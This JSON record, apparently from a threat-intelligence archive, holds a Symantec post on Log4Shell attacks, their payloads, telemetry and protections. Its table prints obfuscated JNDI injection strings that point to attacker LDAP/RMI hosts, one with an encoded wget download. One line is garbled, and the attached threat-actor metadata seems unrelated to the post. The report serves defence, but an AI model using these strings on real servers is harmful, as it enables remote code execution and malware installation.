{
    "id": "0a4a4984-1b1d-49c3-a92e-f8c35f334ce0",
    "created_at": "2023-01-12T15:02:50.071434Z",
    "updated_at": "2025-03-27T02:08:41.338023Z",
    "deleted_at": null,
    "sha1_hash": "c1c3691822eb963173bd1da6a48f200f3359ccab",
    "title": "2021-12-23 - Log4j Vulnerabilities- Attack Insights",
    "authors": "",
    "file_creation_date": "2022-05-27T22:32:01Z",
    "file_modification_date": "2022-05-27T22:32:01Z",
    "file_size": 1173014,
    "plain_text": "# Log4j Vulnerabilities: Attack Insights\n\n**[symantec-enterprise-blogs.security.com/blogs/threat-intelligence/log4j-vulnerabilities-attacks](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/log4j-vulnerabilities-attacks)**\n\nSiddhesh ChandrayanThreat Analysis Engineer\n\nApache Log4j is a Java-based logging utility. The library’s main role is to log information related to security and performance to make error\ndebugging easier and to enable applications to run smoothly. The library is part of the Apache Logging Services, a project of the Apache\nSoftware Foundation.\n\nLog4j has been making headlines recently after the public disclosure of three critical vulnerabilities in the utility which can lead to remote code\nexecution (CVE-2021-44228 and CVE-2021-45046) and denial of service (CVE-2021-45105). The initial remote code execution vulnerability\n(CVE-2021-44228) has been dubbed Log4Shell and has dominated cyber-security news ever since it was publicly disclosed on December 9.\nThe vulnerability has been exploited to deploy a plethora of payloads like coin miners, Dridex malware, and even ransomware such as Conti.\n\n## Variations in attacks\n\n[Symantec, a division of Broadcom Software, has observed numerous variations in attack requests primarily aimed at evading detection. Some](https://software.broadcom.com/)\nsample attack requests can be seen in Table 1.\n\nTable 1. Sample of Log4j vulnerability attack requests seen by Symantec\n\n**Attack requests**\n\n${jndi:ldap://:1389/Exploit}\n\n${jndi:dns://MASKED_IP.1/securityscan-http8085}\n\n${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:l}dap${env:NaN:-:}//MASKED_IP:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMjA5LjE0MS40Ni4xMTQvcmVhZGVyOyBjdXJsIC1\n\n${${lower:${lower:jndi}}:${lower:rmi}://MASKED_IP:1389/Binary}\n\n${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://MASKED_IP:1389/Binary}\n\n${${::-j}${::-n}d${::-i}:${::-l}${::-d}${::-a}${::-p}://${::-1}${::-5}${::-9}.${::-2}${::-2}MASKED_IP:44${::-3}/${::-o}=${::-t}omca${::-t}}\n\n\n-----\n\nttac e s a e p edo a t y us g t e a d p otoco s to do oad a c ous pay oads e a e a so eco ded u e ab ty sca s\nusing protocols such as IIOP, DNS, HTTP, NIS etc.\n\n## Payloads\n\n**Muhstik Botnet - We have observed attackers downloading malicious Java class files as a part of Log4shell exploitation. The malicious class**\nfile downloads a shell file with the content shown in Figure 1.\n\nFigure 1. Content of shell file downloaded by malicious\n\nclass file\nThe shell script attempts to download Executable and Linkable Format (ELF) files and execute them, which leads to the installation of the\nMuhstik botnet.\n\n**XMRig miner - We have also observed attackers installing the XMRig cryptocurrency miner as a part of post-exploitation activity related to**\nLog4shell exploitation. The miner is downloaded via a simple PowerShell command (Figure 2).\n\nFigure 2. PowerShell command used to download\n\nXMRig miner\nThe miner is executed with the command shown in Figure 3.\n\nFigure 3. Command used to execute XMRig miner\n\n**Malicious class file backdoor - We have also seen attacks attempt to download a malicious Java class file that acts as a backdoor. The class**\nfile has code to listen for and execute commands from the attacker (Figure 4).\n\nFigure 4. Code used to listen for and\n\nexecute commands from attacker\n**Reverse Bash shell – Attackers were alsoobserved deploying reverse shells on vulnerable machines (Figure 5).**\n\nFigure 5. Code used to deploy reverse shell on\n\nvulnerable machines\nOther publicly reported payloads include the Khonsari and Conti ransomware threats, the Orcus remote access Trojan (RAT), and the Dridex\nmalware, among others.\n\n\n-----\n\n## Symantec IPS data\n\nFor the period between December 9 (when the first Log4j vulnerability was disclosed) and December 21, Symantec’s Intrusion Prevention\nSystem (IPS) blocked more than 93 million Log4Shell related exploitation attempts on more than 270,000 unique machines.\n\nFigure 6. Blocked Log4Shell related\n\nexploitation attempts against unique machines\nDuring the same time frame, IPS blocked more than 18 million Log4Shell related exploitation attempts on more than 60,000 unique server\nmachines.\n\nFigure 7. Blocked Log4Shell related\n\nexploitation attempts against servers\nThe majority of Log4Shell attacks blocked by Symantec were against machines located in the U.S. and the United Kingdom, followed by\nSingapore, India, and Australia.\n\n\n-----\n\nFigure 8. The majority of Log4Shell\n\nattacks blocked by Symantec were against machines located in the U.S. and United Kingdom\nMeanwhile, the majority of attacks exploiting the Log4j vulnerabilities seem to originate from devices located in the U.S. and Germany, followed\nby Russia, the United Kingdom, and China.\n\nFigure 9. The majority of attackers\n\nexploiting the Log4j vulnerabilities are located in the U.S. and Germany\n\n## Protection\n\n**Behavior-based**\n\nSONAR.Maljava!g7\nSONAR.Ransomware!g1\nSONAR.Ransomware!g31\nSONAR.Ransomware!g32\nSONAR.SuspLaunch!g184\nSONAR.SuspLaunch!g185\n\n**File-based**\n\nCL.Suspexec!gen106\nCL.Suspexec!gen107\nCL.Suspexec!gen108\n\n\n-----\n\nu a te\nMiner.XMRig!gen2\nRansom.Khonsari\nRansom.Tellyouthepass\nRansom.Tellyouthepa!g1\nRansom.Tellyouthepa!g2\nTrojan Horse\nTrojan.Maljava\n\n**Machine learning-based**\n\nHeur.AdvML.C\n\n**Network-based**\n\nAudit: Suspicious Java Class File Executing Arbitrary Commands\nAudit: Log4j2 RCE CVE-2021-44228\nAudit: Malicious LDAP Response\nAttack: Log4j2 RCE CVE-2021-44228 2\nAttack: Malicious LDAP Response\nAttack: Log4j2 RCE CVE-2021-44228\nAttack: Log4j CVE-2021-45046\nAttack: Log4j CVE-2021-45105\nWeb Attack: Malicious Java Payload Download 2\nWeb Attack: Malicious Java Payload Download 3\nWeb Attack: Malicious Java Payload Download 4\n\n**Policy-based**\n\nDCS provides multi-layered protection for Windows, Linux Server workloads, and container applications for this vulnerability:\n\nSuspicious Process Execution: Prevention policies prevent malware from being dropped or executed on the system. DCS hardened\nLinux servers prevent execution of malware from temp or other writable locations, a technique used by attackers to drop crypto miners\nsuch as XMRig in reported Log4shell exploitation.\nReview the Linux proxy execution list for your Log4j-based application sandbox to include additional tools such as */curl, */wget. These\ntools are used by attackers to connect from the victim Log4j application to external command-and-control servers for downloading\nadditional payloads.\nDCS sandboxing of Windows and Linux applications prevent suspicious program execution using living-off-the-land tools and tampering\nof critical system services and resources.\nNetwork Control: Ability to block outgoing connections to public internet and limit required LDAP, HTTP, and other traffic from server\nworkloads and containerized applications using Log4j2 to internal trusted systems.\nDetection Policies: System Attack detection: Baseline_WebAttackDetection_Generic_MaliciousUserAgent rule should be updated to\ninclude *jndi:* select string to alert on malicious server requests using the suspicious jndi lookup attempts via jndi:ldap, jndi:rmi, jndi:dns\netc. Make sure to set the path to your web server access log file in the IDS Web Attack Detection option. Similar custom text log rules\nshould be added for each of your Log4j application log files.\n\n## About the Author\n\n### Siddhesh Chandrayan\n\n**Threat Analysis Engineer**\n\nSiddhesh works for the Intrusion Prevention System (IPS) team in Symantec's Security Technology and Response (STAR) division. He\nanalyzes and creates IPS protection for various network-based threats such as exploit kits and tech support scams.\n\n## Want to comment on this post?\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-12-23 - Log4j Vulnerabilities- Attack Insights.pdf"
    ],
    "report_names": [
        "2021-12-23 - Log4j Vulnerabilities- Attack Insights.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535770,
    "ts_updated_at": 1743041321,
    "ts_creation_date": 1653690721,
    "ts_modification_date": 1653690721,
    "files": {
        "pdf": "https://archive.orkl.eu/c1c3691822eb963173bd1da6a48f200f3359ccab.pdf",
        "text": "https://archive.orkl.eu/c1c3691822eb963173bd1da6a48f200f3359ccab.txt",
        "img": "https://archive.orkl.eu/c1c3691822eb963173bd1da6a48f200f3359ccab.jpg"
    }
}